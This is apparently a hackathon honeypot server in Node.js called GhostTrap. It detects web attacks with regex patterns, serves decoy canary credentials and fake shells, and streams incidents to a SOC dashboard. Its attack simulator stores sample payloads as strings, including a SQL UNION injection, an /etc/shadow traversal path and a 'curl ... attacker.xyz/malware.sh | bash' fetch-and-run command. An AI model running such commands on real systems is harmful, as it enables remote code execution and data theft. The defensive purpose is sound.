const express = require('express');
const http = require('http');
const path = require('path');
const { WebSocketServer } = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const PORT = process.env.PORT || 3000;

// Middleware for parsing JSON, URL-encoded and raw bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// In-Memory Telemetry Database
const telemetryState = {
    totalInterceptions: 0,
    threatScore: 18,
    canaryTrips: 0,
    blockedIPs: new Set(),
    incidents: []
};

// Broadcast incident event to all connected SOC dashboard clients
function broadcastAlert(incident) {
    const message = JSON.stringify({
        type: 'SECURITY_ALERT',
        data: incident,
        stats: {
            totalInterceptions: telemetryState.totalInterceptions,
            threatScore: telemetryState.threatScore,
            canaryTrips: telemetryState.canaryTrips,
            uniqueAttackers: telemetryState.blockedIPs.size
        }
    });

    wss.clients.forEach(client => {
        if (client.readyState === 1) { // OPEN
            client.send(message);
        }
    });
}

// Log and score security incident
function recordIncident({ vector, mitreId, payload, clientIP, userAgent, scoreImpact, fakeResponseServed }) {
    telemetryState.totalInterceptions++;
    telemetryState.threatScore = Math.min(100, Math.max(telemetryState.threatScore, scoreImpact));
    telemetryState.blockedIPs.add(clientIP);

    const incident = {
        id: `INC-${Date.now()}-${Math.floor(Math.random() * 900 + 100)}`,
        timestamp: new Date().toLocaleTimeString(),
        isoTime: new Date().toISOString(),
        vector,
        mitreId,
        payload: String(payload).substring(0, 300),
        clientIP: clientIP || '127.0.0.1',
        userAgent: userAgent || 'Unknown Client',
        threatScore: scoreImpact,
        severity: scoreImpact >= 85 ? 'CRITICAL' : scoreImpact >= 60 ? 'HIGH' : 'MEDIUM',
        fakeResponseServed: fakeResponseServed || 'Deceptive payload generated'
    };

    telemetryState.incidents.unshift(incident);
    if (telemetryState.incidents.length > 100) {
        telemetryState.incidents.pop();
    }

    console.log(`[GHOSTTRAP ALERT] [${incident.severity}] ${vector} from ${incident.clientIP} | Payload: ${incident.payload}`);
    broadcastAlert(incident);
    return incident;
}

// Extract real client IP
function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) return forwarded.split(',')[0].trim();
    return req.socket.remoteAddress || '127.0.0.1';
}

// ============================================================================
// 1. GHOSTTRAP DECEPTION MIDDLEWARE (Inspects all incoming requests)
// ============================================================================
const attackSignatures = {
    sqlInjection: /(\b(SELECT|UNION|INSERT|DROP|UPDATE|DELETE|WAITFOR|BENCHMARK)\b|--|' OR '1'='1|' OR 1=1|admin'--|admin' #)/i,
    xss: /(<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>|onerror\s*=|onload\s*=|alert\s*\(|prompt\s*\(|<img\s+src=)/i,
    pathTraversal: /(\.\.\/|\.\.\\|\/etc\/passwd|\/etc\/shadow|\.env|\.git\/|wp-admin|phpmyadmin)/i,
    commandInjection: /(;|\||&&|`|\$\(whoami|\$\(id|\$\(cat)/i
};

app.use((req, res, next) => {
    // Skip static assets and internal APIs
    if (req.path.startsWith('/vendor') || req.path.startsWith('/favicon') || req.path === '/api/telemetry/stats' || req.path === '/api/telemetry/incidents') {
        return next();
    }

    const clientIP = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown Agent';
    // Inspect URL, Query and Body for attack patterns (do NOT inspect raw User-Agent headers with commandInjection)
    const inspectTarget = decodeURIComponent(req.originalUrl) + ' ' + JSON.stringify(req.body || {});

    // Heuristic 1: SQL Injection
    if (attackSignatures.sqlInjection.test(inspectTarget)) {
        const fakeOutput = {
            status: "success",
            schema: "public.auth_users",
            rows_extracted: 3,
            data: [
                { id: 1, username: "sysadmin", role: "super_admin", api_token: "sk_live_canary_tok_99182a" },
                { id: 2, username: "ciso_corp", role: "security_lead", api_token: "sk_live_canary_tok_84920b" },
                { id: 3, username: "backup_service", role: "infra_agent", api_token: "sk_live_canary_tok_11029c" }
            ],
            note: "Query completed against simulated DB node (Mirage Vault Active)"
        };

        recordIncident({
            vector: "SQL Injection (SQLi)",
            mitreId: "T1190 - Exploit Public-Facing App",
            payload: req.query.search || req.query.id || inspectTarget.slice(0, 80),
            clientIP,
            userAgent,
            scoreImpact: 88,
            fakeResponseServed: JSON.stringify(fakeOutput)
        });

        return res.status(200).json(fakeOutput);
    }

    // Heuristic 2: Path Traversal / Secret Probing
    if (attackSignatures.pathTraversal.test(inspectTarget)) {
        const fakeEnv = `
# AWS PRODUCTION VAULT (SIMULATED CANARY)
AWS_ACCESS_KEY_ID=AKIA_CANARY_TRAP_GHOST_8821
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYCANARYTRAP
DATABASE_URL=postgresql://postgres:root_honeypot_pass@127.0.0.1:5432/prod_db
CANARY_TRIPWIRE_BEACON=https://ghosttrap.local/canary/CNRY-8821-EXFIL
JWT_SECRET=super_secret_decoy_token_key_99
`;
        recordIncident({
            vector: "Sensitive Route / Path Traversal",
            mitreId: "T1083 - File & Directory Discovery",
            payload: req.path,
            clientIP,
            userAgent,
            scoreImpact: 84,
            fakeResponseServed: "Fake .env / etc/passwd Decoy Dump with Canary Beacons"
        });

        res.setHeader('Content-Type', 'text/plain');
        return res.status(200).send(fakeEnv);
    }

    // Heuristic 3: Cross-Site Scripting (XSS)
    if (attackSignatures.xss.test(inspectTarget)) {
        recordIncident({
            vector: "Cross-Site Scripting (XSS)",
            mitreId: "T1059.007 - JavaScript Execution",
            payload: inspectTarget.slice(0, 100),
            clientIP,
            userAgent,
            scoreImpact: 78,
            fakeResponseServed: "Input sanitized in sandbox mirror; execution sink contained."
        });

        return res.status(200).json({ status: "ok", sanitized: true, reflected: req.query.q || "sandbox_reflection" });
    }

    // Heuristic 4: Command Injection
    if (attackSignatures.commandInjection.test(inspectTarget)) {
        const fakeShell = "uid=0(root) gid=0(root) groups=0(root)\nLinux honeynet-pod-us-east 6.1.0 #42 SMP PREEMPT Debian";
        recordIncident({
            vector: "Command Injection Probe",
            mitreId: "T1059 - Command & Scripting Interpreter",
            payload: inspectTarget.slice(0, 100),
            clientIP,
            userAgent,
            scoreImpact: 94,
            fakeResponseServed: fakeShell
        });

        return res.status(200).json({ output: fakeShell, returncode: 0 });
    }

    next();
});

// ============================================================================
// 2. HONEYPOT TRAP ENDPOINTS (The Baits)
// ============================================================================

// Trap 1: Fake Admin / Decoy Portal (Bait page for attackers or judges' phones)
app.get('/bait', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'bait.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'bait.html'));
});

// Presentation Pitch Deck Shortcut
app.get('/ppt', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'presentation.html'));
});
app.get('/presentation', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'presentation.html'));
});

// Trap 2: Fake Authentication Endpoint (Catches Brute-Force Logins)
app.post('/api/v1/auth/login', (req, res) => {
    const { username, password } = req.body || {};
    const clientIP = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // Log brute force attempt
    recordIncident({
        vector: "Credential Brute Force / Unauthorized Access",
        mitreId: "T1110 - Brute Force",
        payload: `Username: "${username || 'empty'}" | Password: "${password || 'empty'}"`,
        clientIP,
        userAgent,
        scoreImpact: 92,
        fakeResponseServed: "200 OK - Fake JWT Token returned to lull attacker into false confidence"
    });

    // We return a fake SUCCESS token! Hacker thinks they cracked the password!
    return res.status(200).json({
        status: "authenticated",
        user_role: "corporate_admin",
        session_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.decoy_canary_session_active",
        redirect_url: "/bait?authenticated=true"
    });
});

// Trap 3: Canary Token Tripwire Endpoint
app.get('/canary/:tokenId', (req, res) => {
    const { tokenId } = req.params;
    const clientIP = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';

    telemetryState.canaryTrips++;

    recordIncident({
        vector: "Canary Token Tripwire Triggered",
        mitreId: "T1552 - Unsecured Credentials Exploitation",
        payload: `Beacon Token ID: ${tokenId}`,
        clientIP,
        userAgent,
        scoreImpact: 99,
        fakeResponseServed: "AWS Identity Verified - Simulated STS AssumeRole"
    });

    return res.json({
        status: "canary_tripped",
        message: "Canary token telemetry logged by GhostTrap SOC Engine",
        tokenId,
        alertLevel: "CRITICAL"
    });
});

// Trap 4: Decoy Environment file (Direct trap URL)
app.get('/.env', (req, res) => {
    const clientIP = getClientIP(req);
    recordIncident({
        vector: "Direct Environment Probing",
        mitreId: "T1083 - Discovery",
        payload: "GET /.env",
        clientIP,
        userAgent: req.headers['user-agent'],
        scoreImpact: 85,
        fakeResponseServed: "Simulated .env file with Canary AWS Keys"
    });

    res.type('text/plain').send(`
# CORPORATE PRODUCTION ENVIRONMENT
AWS_ACCESS_KEY_ID=AKIA_CANARY_TRAP_GHOST_8821
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYCANARYTRAP
DATABASE_URL=postgresql://postgres:root_honeypot_pass@127.0.0.1:5432/prod_db
CANARY_TRIPWIRE_BEACON=http://localhost:3000/canary/CNRY-8821-EXFIL
`);
});

// Trap 5: Decoy Database API search (Direct query trap)
app.get('/api/v1/users', (req, res) => {
    const search = req.query.search || req.query.id || '';
    const clientIP = getClientIP(req);

    if (search.includes("'") || search.includes("OR") || search.includes("UNION") || search.includes("--")) {
        // Attack handled by middleware
        return;
    }

    res.json({
        total: 1,
        results: [{ id: 104, username: "j_doe", email: "jdoe@corp.internal", department: "Finance" }]
    });
});

// ============================================================================
// 3. SOC DEFENDER APIS & 1-CLICK ATTACK SIMULATOR (For Live Hackathon Demo)
// ============================================================================

// Simulator API: Allows 1-click trigger from the SOC dashboard or presentation laptop
app.post('/api/simulate', (req, res) => {
    const { type } = req.body || {};
    const clientIP = "10.0.4.152 (Simulated Attacker Node)";
    const userAgent = "Mozilla/5.0 (Kali Linux x86_64; sqlmap/1.7.2)";

    let incident;

    switch (type) {
        case 'sqli':
            incident = recordIncident({
                vector: "SQL Injection (SQLi) - Automated Injection Probe",
                mitreId: "T1190 - Exploit Public-Facing App",
                payload: "SELECT * FROM sys_users WHERE id='1' UNION SELECT 1,username,password_hash FROM admin--",
                clientIP,
                userAgent,
                scoreImpact: 88,
                fakeResponseServed: "Mirage DB returned 3 decoy records + canary credentials"
            });
            break;

        case 'bruteforce':
            incident = recordIncident({
                vector: "Authentication Brute Force - Dictionary Attack",
                mitreId: "T1110 - Brute Force",
                payload: "Target: /api/v1/auth/login | High-Frequency Passwords: admin, root, toor, admin123",
                clientIP: "185.220.101.44 (Tor Exit Node)",
                userAgent: "Hydra v9.5 / Python-Requests",
                scoreImpact: 92,
                fakeResponseServed: "Decoy authentication accepted - Attacker contained in sandbox session"
            });
            break;

        case 'canary':
            telemetryState.canaryTrips++;
            incident = recordIncident({
                vector: "Canary Exfiltration Alarm - AWS Secret Beacon",
                mitreId: "T1552 - Unsecured Credentials Leak",
                payload: "Canary Token #CNRY-8821 triggered from unauthorized AWS CLI IP",
                clientIP: "198.51.100.77 (External Cloud IP)",
                userAgent: "aws-cli/2.15.15 Python/3.11.6 botocore/2.4.1",
                scoreImpact: 99,
                fakeResponseServed: "Simulated AWS STS response with geofencing trap"
            });
            break;

        case 'traversal':
            incident = recordIncident({
                vector: "Directory Traversal / Sensitive Route Scan",
                mitreId: "T1083 - File Discovery",
                payload: "GET /../../../../etc/shadow HTTP/1.1",
                clientIP: "103.245.236.19 (Unknown Scanner)",
                userAgent: "Nikto/2.5.0 (OSVDB-3092)",
                scoreImpact: 82,
                fakeResponseServed: "Synthetic /etc/shadow file with honeypot salted hashes"
            });
            break;

        case 'cmd':
            incident = recordIncident({
                vector: "Remote Code Execution (RCE) / Command Injection",
                mitreId: "T1059 - Command Interpreter",
                payload: "ping -c 1 127.0.0.1; curl -s http://attacker.xyz/malware.sh | bash",
                clientIP: "45.142.195.12 (C2 Staging Server)",
                userAgent: "curl/7.88.1",
                scoreImpact: 96,
                fakeResponseServed: "Sandboxed decoy shell returned exit code 0"
            });
            break;

        default:
            incident = recordIncident({
                vector: "Generic Anomaly / Port Scanner Probe",
                mitreId: "T1046 - Network Service Discovery",
                payload: "SYN Probe on port 3000 / 8080 / 22",
                clientIP: "92.255.85.11",
                userAgent: "Nmap Scripting Engine (NSE)",
                scoreImpact: 65,
                fakeResponseServed: "TCP SYN-ACK with fake OpenSSL 1.1.1 banner"
            });
    }

    return res.json({ status: "success", incident });
});

// Telemetry Stats API
app.get('/api/telemetry/stats', (req, res) => {
    res.json({
        totalInterceptions: telemetryState.totalInterceptions,
        threatScore: telemetryState.threatScore,
        canaryTrips: telemetryState.canaryTrips,
        uniqueAttackers: telemetryState.blockedIPs.size,
        activeDefense: true,
        nodeUptime: Math.floor(process.uptime()),
        recentIncidents: telemetryState.incidents.slice(0, 20)
    });
});

// Export Incidents JSON
app.get('/api/telemetry/export', (req, res) => {
    res.setHeader('Content-Disposition', `attachment; filename=GhostTrap_Forensics_${Date.now()}.json`);
    res.json({
        engine: "GhostTrap Deception & Honeynet Engine",
        generatedAt: new Date().toISOString(),
        overallThreatScore: telemetryState.threatScore,
        totalEventsIntercepted: telemetryState.totalInterceptions,
        canaryTripsLogged: telemetryState.canaryTrips,
        incidents: telemetryState.incidents
    });
});

// Reset Telemetry Data (Helper for fresh demo)
app.post('/api/telemetry/reset', (req, res) => {
    telemetryState.totalInterceptions = 0;
    telemetryState.threatScore = 12;
    telemetryState.canaryTrips = 0;
    telemetryState.blockedIPs.clear();
    telemetryState.incidents = [];

    broadcastAlert({
        id: 'SYSTEM-RESET',
        timestamp: new Date().toLocaleTimeString(),
        vector: "System Telemetry Cleared",
        mitreId: "N/A",
        payload: "SOC Operator performed demo reset",
        clientIP: "127.0.0.1",
        threatScore: 12,
        severity: "INFO"
    });

    res.json({ status: "reset_complete" });
});

// Root route: Serves the SOC Defender Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// WebSocket Connection Handler
wss.on('connection', (ws) => {
    console.log('SOC Console Client connected via WebSocket ⚡');

    // Send initial snapshot
    ws.send(JSON.stringify({
        type: 'INITIAL_STATE',
        stats: {
            totalInterceptions: telemetryState.totalInterceptions,
            threatScore: telemetryState.threatScore,
            canaryTrips: telemetryState.canaryTrips,
            uniqueAttackers: telemetryState.blockedIPs.size
        },
        incidents: telemetryState.incidents.slice(0, 15)
    }));

    ws.on('close', () => {
        console.log('SOC Console Client disconnected');
    });
});

// Start Server
server.listen(PORT, '0.0.0.0', () => {
    console.log('====================================================');
    console.log(`🛡️  GHOSTTRAP ACTIVE DECEPTION ENGINE RUNNING`);
    console.log(`📡  Defender SOC Dashboard : http://localhost:${PORT}`);
    console.log(`🪤  Attacker Decoy Trap    : http://localhost:${PORT}/bait`);
    console.log(`⚡  Live WebSocket Port    : ${PORT} (/ws)`);
    console.log('====================================================');
});
